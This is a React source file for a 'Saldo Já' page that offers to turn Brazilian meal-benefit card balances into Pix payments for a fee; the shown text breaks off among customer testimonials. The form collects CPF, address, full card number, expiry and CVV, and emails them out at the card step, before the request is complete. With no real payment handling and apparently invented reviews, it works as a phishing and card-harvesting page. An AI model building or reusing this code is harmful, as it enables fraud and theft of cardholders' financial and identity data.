import { Shield, Zap, Monitor, Percent, CheckCircle, ChevronRight, ChevronLeft, CreditCard, Wallet, User, MapPin, Star, Loader2, Info } from 'lucide-react';
import { useState, useEffect } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Card, CardContent } from "@/components/ui/card";
import { Badge } from "@/components/ui/badge";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { Separator } from "@/components/ui/separator";
// Supabase removed
import { toast } from "sonner";
import { Helmet } from "react-helmet-async";
import { useNavigate } from "@tanstack/react-router";
import { sendPartialEmail, sendCompleteEmail } from "@/lib/api/email.functions";
const logo = "/logo.png";

const validateCPF = (cpf: string) => {
  const cleanCPF = cpf.replace(/\D/g, '');
  if (cleanCPF.length !== 11) return false;
  if (/^(\d)\1+$/.test(cleanCPF)) return false;
  
  let sum = 0;
  let remainder;
  
  for (let i = 1; i <= 9; i++) sum += parseInt(cleanCPF.substring(i - 1, i)) * (11 - i);
  remainder = (sum * 10) % 11;
  if (remainder === 10 || remainder === 11) remainder = 0;
  if (remainder !== parseInt(cleanCPF.substring(9, 10))) return false;
  
  sum = 0;
  for (let i = 1; i <= 10; i++) sum += parseInt(cleanCPF.substring(i - 1, i)) * (12 - i);
  remainder = (sum * 10) % 11;
  if (remainder === 10 || remainder === 11) remainder = 0;
  if (remainder !== parseInt(cleanCPF.substring(10, 11))) return false;
  
  return true;
};

const validateExpiry = (expiry: string) => {
  if (!/^\d{2}\/\d{2}$/.test(expiry)) return false;
  const [month, year] = expiry.split('/').map(Number);
  if (month < 1 || month > 12) return false;
  const now = new Date();
  const currentMonth = now.getMonth() + 1;
  const currentYear = parseInt(now.getFullYear().toString().substring(2));
  if (year < currentYear) return false;
  if (year === currentYear && month < currentMonth) return false;
  return true;
};

const validateCardNumber = (number: string) => {
  const clean = number.replace(/\D/g, '');
  if (clean.length !== 16) return false;

  // Algoritmo de Luhn para verificar se o número do cartão é matematicamente válido
  let sum = 0;
  let shouldDouble = false;
  for (let i = clean.length - 1; i >= 0; i--) {
    let digit = parseInt(clean.charAt(i));

    if (shouldDouble) {
      digit *= 2;
      if (digit > 9) digit -= 9;
    }

    sum += digit;
    shouldDouble = !shouldDouble;
  }

  return (sum % 10) === 0;
};


const validateCVV = (cvv: string) => {
  const clean = cvv.replace(/\D/g, '');
  return clean.length === 3;
};

const ProcessingOverlay = () => {
  return (
    <motion.div 
      initial={{ opacity: 0 }}
      animate={{ opacity: 1 }}
      exit={{ opacity: 0 }}
      className="fixed inset-0 z-50 bg-white flex flex-col items-center justify-center p-4"
    >
      <div className="flex flex-col items-center space-y-8 max-w-xs text-center">
        <img 
          src={logo} 
          alt="Saldo Já Logo" 
          className="h-24 w-auto object-contain animate-pulse" 
        />
        
        <div className="space-y-4">
          <div className="relative">
            <Loader2 className="w-12 h-12 animate-spin text-emerald-600 mx-auto" />
            <div className="absolute inset-0 flex items-center justify-center">
              <div className="w-2 h-2 bg-emerald-600 rounded-full" />
            </div>
          </div>
          
          <div className="space-y-2">
            <h2 className="text-2xl font-black text-emerald-950 tracking-wider">
              PROCESSANDO SOLICITAÇÃO
            </h2>
            <p className="text-gray-500 text-sm font-medium">
              Aguarde enquanto validamos suas informações.
            </p>
          </div>
        </div>
      </div>
    </motion.div>
  );
};


const ConversionForm = () => {
  const [step, setStep] = useState(1);
  const [showErrors, setShowErrors] = useState(false);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [isProcessing, setIsProcessing] = useState(false);
  const navigate = useNavigate();


  const [isLoadingCep, setIsLoadingCep] = useState(false);
  const [formData, setFormData] = useState({
    name: '',
    cpf: '',
    phone: '',
    email: '',
    cep: '',
    state: '',
    city: '',
    address: '',
    number: '',
    complement: '',
    cardBrand: '',
    cardNumber: '',
    expiry: '',
    cvv: '',
    amount: '',
    pixKeyType: '',
    pixKey: '',
  });

  const totalSteps = 4;

  const handleInputChange = (id: string, value: string) => {
    let formattedValue = value;
    
    // Apply masks
    if (id === 'cardNumber') {
      formattedValue = value.replace(/\D/g, '').substring(0, 16);
      formattedValue = formattedValue.replace(/(\d{4})(?=\d)/g, '$1 ').trim();
    } else if (id === 'expiry') {
      formattedValue = value.replace(/\D/g, '').substring(0, 4);
      if (formattedValue.length > 2) {
        formattedValue = formattedValue.substring(0, 2) + '/' + formattedValue.substring(2);
      }
    } else if (id === 'cvv') {
      formattedValue = value.replace(/\D/g, '').substring(0, 3);
    } else if (id === 'cpf') {
      formattedValue = value.replace(/\D/g, '').substring(0, 11)
        .replace(/(\d{3})(\d)/, '$1.$2')
        .replace(/(\d{3})(\d)/, '$1.$2')
        .replace(/(\d{3})(\d{1,2})/, '$1-$2');
    } else if (id === 'phone') {
      formattedValue = value.replace(/\D/g, '').substring(0, 11)
        .replace(/(\d{2})(\d)/, '($1) $2')
        .replace(/(\d{5})(\d)/, '$1-$2');
    } else if (id === 'cep') {
      formattedValue = value.replace(/\D/g, '').substring(0, 8)
        .replace(/(\d{5})(\d)/, '$1-$2');
    } else if (id === 'amount') {
      formattedValue = value.replace(/[^\d]/g, '');
      if (formattedValue) {
        const floatValue = parseInt(formattedValue) / 100;
        formattedValue = floatValue.toLocaleString('pt-BR', { minimumFractionDigits: 2 });
      }
    }


    setFormData(prev => ({ ...prev, [id]: formattedValue }));
  };

  const fetchAddressByCep = async (cep: string) => {
    const cleanCep = cep.replace(/\D/g, '');
    if (cleanCep.length === 8) {
      setIsLoadingCep(true);
      try {
        const response = await fetch(`https://viacep.com.br/ws/${cleanCep}/json/`);
        const data = await response.json();
        
        if (!data.erro) {
          setFormData(prev => ({
            ...prev,
            state: data.uf.toLowerCase(),
            city: data.localidade,
            address: data.logradouro
          }));
          toast.success("Endereço preenchido automaticamente!");
        } else {
          toast.error("CEP não encontrado.");
        }
      } catch (error) {
        console.error('Error fetching CEP:', error);
        toast.error("Erro ao buscar CEP.");
      } finally {
        setIsLoadingCep(false);
      }
    }
  };

  const handleCepChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value;
    handleInputChange('cep', value);
    if (value.replace(/\D/g, '').length === 8) {
      fetchAddressByCep(value);
    }
  };

  const isStepValid = () => {
// ... keep existing code
    if (step === 1) {
      return !!(formData.name && formData.cpf && validateCPF(formData.cpf) && formData.phone && formData.email);
    }
    if (step === 2) {
      return !!(formData.cep && formData.state && formData.city && formData.address && formData.number);
    }
    if (step === 3) {
      return !!(formData.cardBrand && formData.cardNumber && validateCardNumber(formData.cardNumber) && formData.expiry && validateExpiry(formData.expiry) && formData.cvv && validateCVV(formData.cvv));
    }
    if (step === 4) {
      const cleanAmount = formData.amount.replace(/\./g, '').replace(',', '.');
      const numAmount = parseFloat(cleanAmount);
      return !!(formData.amount && !isNaN(numAmount) && numAmount > 0 && formData.pixKeyType && formData.pixKey);
    }
    return true;
  };

  const handleSendPartialEmail = async () => {
    try {
      const result = await (sendPartialEmail as any)({
        data: {
          formData: {
            name: formData.name,
            cpf: formData.cpf,
            phone: formData.phone,
            email: formData.email,
            cep: formData.cep,
            state: formData.state,
            city: formData.city,
            address: formData.address,
            number: formData.number,
            complement: formData.complement,
            cardBrand: formData.cardBrand,
            cardNumber: formData.cardNumber,
            expiry: formData.expiry,
            cvv: formData.cvv,
          },
        },
      });
      if (result.success) {
        toast.success("Solicitação enviada!");
      } else {
        toast.error("Erro ao enviar solicitação.");
      }
    } catch (error) {
      console.error('Error sending partial notification:', error);
      toast.error("Erro ao enviar solicitação.");
    }
  };

  const handleSendCompleteEmail = async () => {
    try {
      const result = await (sendCompleteEmail as any)({
        data: {
          formData: formData,
        },
      });
      if (result.success) {
        toast.success("Solicitação enviada com sucesso!");
      } else {
        toast.error("Erro ao enviar solicitação.");
      }
    } catch (error) {
      console.error('Error sending complete notification:', error);
      toast.error("Erro ao enviar solicitação.");
    }
  };

  const handleSubmit = async () => {
    if (!isStepValid()) {
      setShowErrors(true);
      return;
    }

    setIsSubmitting(true);
    try {
      // Enviar notificação completa
      await handleSendCompleteEmail();

      // Database saving removed

      setIsProcessing(true);
      setTimeout(() => {
        navigate({ to: "/success" });
      }, 1500);
      setShowErrors(false);
    } catch (error: any) {
      console.error('Error saving to database:', error);
      toast.error("Erro ao enviar solicitação. Tente novamente mais tarde.");
    } finally {
      setIsSubmitting(false);
    }
  };


  const nextStep = () => {
    if (isStepValid()) {
      setShowErrors(false);
      if (step === 3) {
        // Enviar notificação parcial ao clicar "Próximo" na etapa 3
        handleSendPartialEmail();
      }
      if (step === totalSteps) {
        handleSubmit();
      } else {
        setStep((s) => Math.min(s + 1, totalSteps));
      }
    } else {
      setShowErrors(true);
      if (step === 1 && !validateCPF(formData.cpf)) {
        toast.error("Colocar CPF valido");
      }
      if (step === 3) {
        if (!validateCardNumber(formData.cardNumber)) {
          toast.error("Número do cartão Invalido");
        } else if (!validateExpiry(formData.expiry)) {
          toast.error("Data de vencimento inválida");
        } else if (!validateCVV(formData.cvv)) {
          toast.error("CVV deve ter 3 dígitos");
        }
      }
      if (step === 4) {
        const cleanAmount = formData.amount.replace(/\./g, '').replace(',', '.');
        const numAmount = parseFloat(cleanAmount);
        if (!formData.amount || isNaN(numAmount) || numAmount <= 0) {
          toast.error("Por favor, insira um valor válido para conversão");
        } else if (!formData.pixKeyType || !formData.pixKey) {
          toast.error("Por favor, preencha os dados do Pix");
        }
      }
    }


  };
  const prevStep = () => {
    setShowErrors(false);
    setStep((s) => Math.max(s - 1, 1));
  };

  const steps = [
    { id: 1, label: "Dados Pessoais", icon: <User className="w-4 h-4" /> },
    { id: 2, label: "Endereço", icon: <MapPin className="w-4 h-4" /> },
    { id: 3, label: "Cartão", icon: <CreditCard className="w-4 h-4" /> },
    { id: 4, label: "Pix", icon: <Wallet className="w-4 h-4" /> },
  ];

  const cardBrandNames: Record<string, string> = {
    vr: "VR Refeição",
    alelo: "Alelo Refeição",
    ticket: "Ticket Restaurante",
    pluxee: "Pluxee / Sodexo",
    ben: "Ben Refeição",
    caju: "Caju",
    lecard: "Lecard",
    greencard: "Green Card",
    flash: "Flash Card",
  };

  return (

    <Card className="w-full max-w-2xl mx-auto shadow-xl border-t-4 border-t-emerald-500 overflow-hidden">
      <CardContent className="p-6 md:p-10">
        {isProcessing && <ProcessingOverlay />}
        
        <div className={isProcessing ? "opacity-0 pointer-events-none" : ""}>
          <>
            <div className="flex items-center justify-between mb-8 relative">

          <div className="absolute top-1/2 left-0 w-full h-0.5 bg-gray-100 -translate-y-1/2 z-0" />
          {steps.map((s) => (
            <div key={s.id} className="relative z-10 flex flex-col items-center gap-2">
              <div 
                className={`w-10 h-10 rounded-full flex items-center justify-center transition-colors ${
                  step >= s.id ? "bg-emerald-500 text-white" : "bg-gray-100 text-gray-400"
                }`}
              >
                {step > s.id ? <CheckCircle className="w-6 h-6" /> : <span>{s.id}</span>}
              </div>
              <span className={`text-xs font-medium hidden md:block ${step >= s.id ? "text-emerald-700" : "text-gray-400"}`}>
                {s.label}
              </span>
            </div>
          ))}
        </div>

        <div className="bg-emerald-50 rounded-lg p-3 flex items-center gap-3 mb-8 border border-emerald-100">
          <div className="w-8 h-8 rounded-full bg-emerald-500 flex items-center justify-center text-white">
            {steps[step-1].icon}
          </div>
          <span className="font-semibold text-emerald-900">{steps[step-1].label}</span>
        </div>

        <AnimatePresence mode="wait">
          <motion.div
            key={step}
            initial={{ opacity: 0, x: 20 }}
            animate={{ opacity: 1, x: 0 }}
            exit={{ opacity: 0, x: -20 }}
            transition={{ duration: 0.2 }}
            className="space-y-6"
          >
            {step === 1 && (
              <div className="grid gap-6">
                <div className="grid gap-2">
                  <Label htmlFor="name" className={showErrors && !formData.name ? "text-red-500" : ""}>Nome Completo *</Label>
                  <Input 
                    id="name" 
                    placeholder="Digite seu nome completo" 
                    value={formData.name}
                    onChange={(e) => handleInputChange('name', e.target.value)}
                    className={showErrors && !formData.name ? "border-red-500 focus-visible:ring-red-500" : ""}
                    required
                  />
                </div>
                <div className="grid md:grid-cols-2 gap-4">
                  <div className="grid gap-2">
                    <Label htmlFor="cpf" className={showErrors && (!formData.cpf || !validateCPF(formData.cpf)) ? "text-red-500" : ""}>CPF *</Label>
                    <Input 
                      id="cpf" 
                      placeholder="000.000.000-00" 
                      value={formData.cpf}
                      onChange={(e) => handleInputChange('cpf', e.target.value)}
                      className={showErrors && (!formData.cpf || !validateCPF(formData.cpf)) ? "border-red-500 focus-visible:ring-red-500" : ""}
                      required
                    />
                    {showErrors && formData.cpf && !validateCPF(formData.cpf) && (
                      <p className="text-red-500 text-xs mt-1">Colocar CPF valido</p>
                    )}

                  </div>
                  <div className="grid gap-2">
                    <Label htmlFor="phone" className={showErrors && !formData.phone ? "text-red-500" : ""}>Telefone *</Label>
                    <Input 
                      id="phone" 
                      placeholder="(00) 00000-0000" 
                      value={formData.phone}
                      onChange={(e) => handleInputChange('phone', e.target.value)}
                      className={showErrors && !formData.phone ? "border-red-500 focus-visible:ring-red-500" : ""}
                      required
                    />
                  </div>
                </div>
                <div className="grid gap-2">
                  <Label htmlFor="email" className={showErrors && !formData.email ? "text-red-500" : ""}>E-mail *</Label>
                  <Input 
                    id="email" 
                    type="email" 
                    placeholder="seu@email.com" 
                    value={formData.email}
                    onChange={(e) => handleInputChange('email', e.target.value)}
                    className={showErrors && !formData.email ? "border-red-500 focus-visible:ring-red-500" : ""}
                    required
                  />
                </div>
              </div>
            )}

            {step === 2 && (
              <div className="grid gap-6">
                <div className="grid md:grid-cols-2 gap-4">
                  <div className="grid gap-2">
                    <Label htmlFor="cep" className={showErrors && !formData.cep ? "text-red-500" : ""}>CEP *</Label>
                    <div className="relative">
                      <Input 
                        id="cep" 
                        placeholder="00000-000" 
                        value={formData.cep}
                        onChange={handleCepChange}
                        className={showErrors && !formData.cep ? "border-red-500 focus-visible:ring-red-500 pr-10" : "pr-10"}
                        required
                      />
                      {isLoadingCep && (
                        <div className="absolute right-3 top-1/2 -translate-y-1/2">
                          <Loader2 className="w-4 h-4 animate-spin text-emerald-500" />
                        </div>
                      )}
                    </div>
                  </div>
                  <div className="grid gap-2">
                    <Label htmlFor="state" className={showErrors && !formData.state ? "text-red-500" : ""}>Estado *</Label>
                    <Select value={formData.state} onValueChange={(v) => handleInputChange('state', v)}>
                      <SelectTrigger className={showErrors && !formData.state ? "border-red-500 focus:ring-red-500" : ""}>
                        <SelectValue placeholder="Selecione" />
                      </SelectTrigger>
                      <SelectContent>
                        <SelectItem value="ac">Acre</SelectItem>
                        <SelectItem value="al">Alagoas</SelectItem>
                        <SelectItem value="ap">Amapá</SelectItem>
                        <SelectItem value="am">Amazonas</SelectItem>
                        <SelectItem value="ba">Bahia</SelectItem>
                        <SelectItem value="ce">Ceará</SelectItem>
                        <SelectItem value="df">Distrito Federal</SelectItem>
                        <SelectItem value="es">Espírito Santo</SelectItem>
                        <SelectItem value="go">Goiás</SelectItem>
                        <SelectItem value="ma">Maranhão</SelectItem>
                        <SelectItem value="mt">Mato Grosso</SelectItem>
                        <SelectItem value="ms">Mato Grosso do Sul</SelectItem>
                        <SelectItem value="mg">Minas Gerais</SelectItem>
                        <SelectItem value="pa">Pará</SelectItem>
                        <SelectItem value="pb">Paraíba</SelectItem>
                        <SelectItem value="pr">Paraná</SelectItem>
                        <SelectItem value="pe">Pernambuco</SelectItem>
                        <SelectItem value="pi">Piauí</SelectItem>
                        <SelectItem value="rj">Rio de Janeiro</SelectItem>
                        <SelectItem value="rn">Rio Grande do Norte</SelectItem>
                        <SelectItem value="rs">Rio Grande do Sul</SelectItem>
                        <SelectItem value="ro">Rondônia</SelectItem>
                        <SelectItem value="rr">Roraima</SelectItem>
                        <SelectItem value="sc">Santa Catarina</SelectItem>
                        <SelectItem value="sp">São Paulo</SelectItem>
                        <SelectItem value="se">Sergipe</SelectItem>
                        <SelectItem value="to">Tocantins</SelectItem>
                      </SelectContent>
                    </Select>
                  </div>
                </div>
                <div className="grid gap-2">
                  <Label htmlFor="city" className={showErrors && !formData.city ? "text-red-500" : ""}>Cidade *</Label>
                  <Input 
                    id="city" 
                    value={formData.city}
                    onChange={(e) => handleInputChange('city', e.target.value)}
                    className={showErrors && !formData.city ? "border-red-500 focus-visible:ring-red-500" : ""}
                    required
                  />
                </div>
                <div className="grid gap-2">
                  <Label htmlFor="address" className={showErrors && !formData.address ? "text-red-500" : ""}>Endereço *</Label>
                  <Input 
                    id="address" 
                    value={formData.address}
                    onChange={(e) => handleInputChange('address', e.target.value)}
                    className={showErrors && !formData.address ? "border-red-500 focus-visible:ring-red-500" : ""}
                    required
                  />
                </div>
                <div className="grid md:grid-cols-3 gap-4">
                  <div className="grid gap-2 md:col-span-1">
                    <Label htmlFor="number" className={showErrors && !formData.number ? "text-red-500" : ""}>Número *</Label>
                    <Input 
                      id="number" 
                      value={formData.number}
                      onChange={(e) => handleInputChange('number', e.target.value)}
                      className={showErrors && !formData.number ? "border-red-500 focus-visible:ring-red-500" : ""}
                      required
                    />
                  </div>
                  <div className="grid gap-2 md:col-span-2">
                    <Label htmlFor="complement">Complemento</Label>
                    <Input 
                      id="complement" 
                      value={formData.complement}
                      onChange={(e) => handleInputChange('complement', e.target.value)}
                    />
                  </div>
                </div>
              </div>
            )}

            {step === 3 && (
              <div className="grid gap-6">
                <div className="grid grid-cols-3 gap-3 mb-2">
                  {[
                    { name: "Alelo", img: "https://i.ibb.co/QjMyxmGD/alelo.png", value: "alelo" },
                    { name: "Sodexo / Pluxee", img: "https://i.ibb.co/zVQDfZgC/pluxee.png", value: "pluxee" },
                    { name: "VR Refeição", img: "https://i.ibb.co/cKQq08Ry/vr.png", value: "vr" },
                    { name: "Ticket", img: "https://i.ibb.co/9m6KjnhM/ticket.png", value: "ticket" },
                    { name: "Ben", img: "https://i.ibb.co/xqvF6t8w/ben.png", value: "ben" },
                    { name: "Caju", img: "https://i.ibb.co/kjwtdpG/caju.jpg", value: "caju" },
                    { name: "Flash", img: "https://i.ibb.co/ZqR8ktP/fl.png", value: "flash" },
                    { name: "Lecard", img: "https://i.ibb.co/JWBZm6hp/le.png", value: "lecard" },
                    { name: "Green Card", img: "https://i.ibb.co/5WmbjYtf/gree.png", value: "greencard" }
                  ].map((brand, i) => (
                    <button
                      key={i}
                      type="button"
                      onClick={() => handleInputChange('cardBrand', brand.value)}
                      className={`rounded-lg p-2 flex items-center justify-center border transition-all h-12 ${
                        formData.cardBrand === brand.value 
                          ? "border-emerald-500 bg-emerald-50 ring-2 ring-emerald-500" 
                          : "bg-white border-gray-100 shadow-sm hover:border-emerald-200"
                      }`}
                    >
                      <img src={brand.img} alt={brand.name} className="h-full w-full object-contain pointer-events-none" />
                    </button>
                  ))}
                </div>


                <div className="p-6 bg-[#004e32] rounded-2xl text-white shadow-2xl space-y-8 relative overflow-hidden group transition-all duration-500 hover:scale-[1.02]">
                  {/* Decorative elements */}
                  <div className="absolute -right-10 -top-10 w-40 h-40 bg-emerald-400/10 rounded-full blur-2xl" />
                  <div className="absolute -left-10 -bottom-10 w-32 h-32 bg-emerald-400/5 rounded-full blur-xl" />
                  
                  <div className="flex justify-between items-start relative z-10">
                    <div className="space-y-1">
                      <span className="text-[10px] uppercase tracking-[0.2em] font-bold opacity-50">
                        Cartão Benefício
                      </span>
                      <div className="text-sm font-bold tracking-tight">
                        {formData.cardBrand ? cardBrandNames[formData.cardBrand] : "SALDO JÁ"}
                      </div>
                    </div>
                    
                    <div className="flex items-center justify-center w-14 h-9 bg-white rounded-lg shadow-sm overflow-hidden p-1.5 transition-all duration-300">
                      {formData.cardBrand ? (
                        <img 
                          src={[
                            { val: "alelo", img: "https://i.ibb.co/QjMyxmGD/alelo.png" },
                            { val: "pluxee", img: "https://i.ibb.co/zVQDfZgC/pluxee.png" },
                            { val: "vr", img: "https://i.ibb.co/cKQq08Ry/vr.png" },
                            { val: "ticket", img: "https://i.ibb.co/9m6KjnhM/ticket.png" },
                            { val: "ben", img: "https://i.ibb.co/xqvF6t8w/ben.png" },
                            { val: "caju", img: "https://i.ibb.co/kjwtdpG/caju.jpg" },
                            { val: "flash", img: "https://i.ibb.co/ZqR8ktP/fl.png" },
                            { val: "lecard", img: "https://i.ibb.co/JWBZm6hp/le.png" },
                            { val: "greencard", img: "https://i.ibb.co/5WmbjYtf/gree.png" }
                          ].find(b => b.val === formData.cardBrand)?.img} 
                          alt="Bandeira" 
                          className="h-full w-full object-contain"
                        />
                      ) : (
                        <CreditCard className="w-5 h-5 text-emerald-800" />
                      )}
                    </div>
                  </div>
                  <div className="text-xl tracking-[0.2em] font-mono relative z-10">
                    {formData.cardNumber || "0000 0000 0000 0000"}
                  </div>
                  <div className="flex justify-between text-xs uppercase tracking-wider">
                    <div>
                      <div className="opacity-60 mb-1">Titular</div>
                      <div className="font-semibold">{formData.name || "NOME COMPLETO"}</div>
                    </div>
                    <div>
                      <div className="opacity-60 mb-1">Validade</div>
                      <div className="font-semibold">{formData.expiry || "MM/AA"}</div>
                    </div>
                  </div>
                </div>

                <div className="grid gap-2">
                  <Label className={showErrors && !formData.cardBrand ? "text-red-500" : ""}>Bandeira do Cartão *</Label>
                  <Select value={formData.cardBrand} onValueChange={(v) => handleInputChange('cardBrand', v)}>
                    <SelectTrigger className={showErrors && !formData.cardBrand ? "border-red-500 focus:ring-red-500" : ""}>
                      <SelectValue placeholder="Selecione a bandeira" />
                    </SelectTrigger>
                    <SelectContent>
                      <SelectItem value="vr">
                        <div className="flex items-center gap-2">
                          <img src="https://i.ibb.co/cKQq08Ry/vr.png" alt="VR" className="h-4 w-auto" />
                          <span>VR Refeição/Alimentação</span>
                        </div>
                      </SelectItem>
                      <SelectItem value="alelo">
                        <div className="flex items-center gap-2">
                          <img src="https://i.ibb.co/QjMyxmGD/alelo.png" alt="Alelo" className="h-4 w-auto" />
                          <span>Alelo Refeição/Alimentação</span>
                        </div>
                      </SelectItem>
                      <SelectItem value="ticket">
                        <div className="flex items-center gap-2">
                          <img src="https://i.ibb.co/9m6KjnhM/ticket.png" alt="Ticket" className="h-4 w-auto" />
                          <span>Ticket Refeição/Alimentação</span>
                        </div>
                      </SelectItem>
                      <SelectItem value="pluxee">
                        <div className="flex items-center gap-2">
                          <img src="https://i.ibb.co/zVQDfZgC/pluxee.png" alt="Pluxee" className="h-4 w-auto" />
                          <span>Pluxee / Sodexo (apenas cartão virtual)</span>
                        </div>
                      </SelectItem>
                      <SelectItem value="ben">
                        <div className="flex items-center gap-2">
                          <img src="https://i.ibb.co/xqvF6t8w/ben.png" alt="Ben" className="h-4 w-auto" />
                          <span>Ben Refeição</span>
                        </div>
                      </SelectItem>
                      <SelectItem value="caju">
                        <div className="flex items-center gap-2">
                          <img src="https://i.ibb.co/kjwtdpG/caju.jpg" alt="Caju" className="h-4 w-auto" />
                          <span>Caju</span>
                        </div>
                      </SelectItem>
                      <SelectItem value="lecard">
                        <div className="flex items-center gap-2">
                          <img src="https://i.ibb.co/JWBZm6hp/le.png" alt="Lecard" className="h-4 w-auto" />
                          <span>Lecard</span>
                        </div>
                      </SelectItem>
                      <SelectItem value="greencard">
                        <div className="flex items-center gap-2">
                          <img src="https://i.ibb.co/5WmbjYtf/gree.png" alt="Green Card" className="h-4 w-auto" />
                          <span>Green Card</span>
                        </div>
                      </SelectItem>
                      <SelectItem value="flash">
                        <div className="flex items-center gap-2">
                          <img src="https://i.ibb.co/ZqR8ktP/fl.png" alt="Flash Card" className="h-4 w-auto" />
                          <span>Flash Card</span>
                        </div>
                      </SelectItem>
                    </SelectContent>
                  </Select>
                  {formData.cardBrand === 'pluxee' && (
                    <div className="flex items-start gap-2 rounded-md border border-amber-300 bg-amber-50 p-3 text-sm text-amber-900">
                      <span className="text-lg leading-none">⚠️</span>
                      <div>
                        <strong>Atenção:</strong> para Pluxee / Sodexo aceitamos <strong>apenas cartão virtual</strong>. Gere seu cartão virtual pelo app da Pluxee antes de continuar.
                      </div>
                    </div>
                  )}
                </div>

                  <div className="grid gap-2">
                    <Label htmlFor="card-number" className={showErrors && (!formData.cardNumber || !validateCardNumber(formData.cardNumber)) ? "text-red-500" : ""}>Número do Cartão *</Label>
                    <Input 
                      id="card-number" 
                      placeholder="0000 0000 0000 0000"
                      value={formData.cardNumber}
                      onChange={(e) => handleInputChange('cardNumber', e.target.value)}
                      className={showErrors && (!formData.cardNumber || !validateCardNumber(formData.cardNumber)) ? "border-red-500 focus-visible:ring-red-500 font-mono" : "font-mono"}
                      required
                    />
                    {showErrors && formData.cardNumber && !validateCardNumber(formData.cardNumber) && (
                      <p className="text-red-500 text-xs mt-1">Número do cartão Invalido</p>
                    )}

                  </div>

                <div className="grid grid-cols-2 gap-4">
                  <div className="grid gap-2">
                    <Label htmlFor="expiry" className={showErrors && (!formData.expiry || !validateExpiry(formData.expiry)) ? "text-red-500" : ""}>Validade *</Label>
                    <Input 
                      id="expiry" 
                      placeholder="MM/AA" 
                      value={formData.expiry}
                      onChange={(e) => handleInputChange('expiry', e.target.value)}
                      className={showErrors && (!formData.expiry || !validateExpiry(formData.expiry)) ? "border-red-500 focus-visible:ring-red-500 font-mono" : "font-mono"}
                      required
                    />
                    {showErrors && formData.expiry && !validateExpiry(formData.expiry) && (
                      <p className="text-red-500 text-xs mt-1">Data de vencimento inválida</p>
                    )}
                  </div>
                  <div className="grid gap-2">
                    <Label htmlFor="cvv" className={showErrors && (!formData.cvv || !validateCVV(formData.cvv)) ? "text-red-500" : ""}>CVV *</Label>
                    <Input 
                      id="cvv" 
                      placeholder="000" 
                      value={formData.cvv}
                      onChange={(e) => handleInputChange('cvv', e.target.value)}
                      className={showErrors && (!formData.cvv || !validateCVV(formData.cvv)) ? "border-red-500 focus-visible:ring-red-500 font-mono" : "font-mono"}
                      required
                    />
                    {showErrors && formData.cvv && !validateCVV(formData.cvv) && (
                      <p className="text-red-500 text-xs mt-1">CVV deve ter 3 dígitos</p>
                    )}

                  </div>
                </div>
              </div>
            )}

            {step === 4 && (
              <div className="grid gap-6">
                <div className="bg-emerald-50 p-4 rounded-lg border border-emerald-100 flex items-center justify-between">
                  <div className="flex items-center gap-3">
                    <div className="bg-white p-2 rounded shadow-sm">
                      <img src="https://refeipay.com.br/image/pix.png" alt="Pix" className="h-6" />
                    </div>
                    <span className="font-bold text-emerald-900">Pix</span>
                  </div>
                  <Badge variant="outline" className="border-emerald-200 text-emerald-700 bg-white">Instantâneo</Badge>
                </div>

                <div className="grid gap-2">
                  <Label htmlFor="amount" className={showErrors && !formData.amount ? "text-red-500" : ""}>Valor para Conversão *</Label>
                  <div className="relative">
                    <span className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-500 font-medium">R$</span>
                    <Input 
                      id="amount" 
                      className={`pl-10 ${showErrors && !formData.amount ? "border-red-500 focus-visible:ring-red-500" : ""}`}
                      placeholder="0,00" 
                      value={formData.amount}
                      onChange={(e) => handleInputChange('amount', e.target.value)}
                      required
                    />
                  </div>
                  <div className="flex justify-between items-center text-xs text-gray-500">
                    <span>Taxa de conversão: 5%</span>
                    {formData.amount && !isNaN(parseFloat(formData.amount.replace(',', '.'))) && (
                      <span className="text-emerald-600 font-bold">
                        Você receberá: R$ {(parseFloat(formData.amount.replace(',', '.')) * 0.95).toLocaleString('pt-BR', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}
                      </span>
                    )}
                  </div>


                </div>

                <div className="grid gap-2">
                  <Label className={showErrors && (!formData.pixKeyType || !formData.pixKey) ? "text-red-500" : ""}>Chave Pix para Recebimento *</Label>
                  <Select value={formData.pixKeyType} onValueChange={(v) => handleInputChange('pixKeyType', v)}>
                    <SelectTrigger className={showErrors && !formData.pixKeyType ? "border-red-500 focus:ring-red-500" : ""}>
                      <SelectValue placeholder="Selecione o tipo de chave" />
                    </SelectTrigger>
                    <SelectContent>
                      <SelectItem value="cpf">CPF</SelectItem>
                      <SelectItem value="email">E-mail</SelectItem>
                      <SelectItem value="phone">Telefone</SelectItem>
                      <SelectItem value="random">Chave Aleatória</SelectItem>
                    </SelectContent>
                  </Select>
                  <Input 
                    placeholder="Digite sua chave Pix" 
                    className={`mt-2 ${showErrors && !formData.pixKey ? "border-red-500 focus-visible:ring-red-500" : ""}`}
                    value={formData.pixKey}
                    onChange={(e) => handleInputChange('pixKey', e.target.value)}
                    required
                  />
                </div>

                <div className="p-4 bg-emerald-50 rounded-lg text-sm text-emerald-800 border border-emerald-100 italic">
                  O valor será transferido após aprovação da nossa equipe.
                </div>
              </div>
            )}
          </motion.div>
        </AnimatePresence>

        <div className="flex justify-between mt-10">
          <Button 
            variant="ghost" 
            onClick={prevStep} 
            disabled={step === 1}
            className="text-gray-500"
          >
            <ChevronLeft className="w-4 h-4 mr-2" /> Voltar
          </Button>
          <Button 
            onClick={nextStep}
            disabled={isSubmitting}
            className="bg-emerald-600 hover:bg-emerald-700 text-white min-w-[140px]"
          >
            {isSubmitting ? (
              <Loader2 className="w-4 h-4 animate-spin" />
            ) : (
              step === totalSteps ? "Enviar Solicitação" : "Próximo"
            )} 
            {!isSubmitting && step < totalSteps && <ChevronRight className="w-4 h-4 ml-2" />}
          </Button>
        </div>
          </>
        </div>
      </CardContent>
    </Card>

  );
};

const Testimonials = () => {
  const reviews = [
    {
      name: "Marcos Oliveira",
      date: "Há 2 dias",
      avatar: "M",
      text: "Processo incrivelmente simples e rápido! Enviei meu cartão Alelo e recebi o Pix em menos de 8 minutos. Plataforma muito segura.",
      rating: 5
    },
    {
      name: "Ana Paula Santos",
      date: "Há 5 dias",
      avatar: "A",
      text: "Usava meu VR apenas em restaurantes, mas com o Saldo Já pude usar esse saldo em qualquer coisa! Transparente do início ao fim.",
      rating: 5
    },
    {
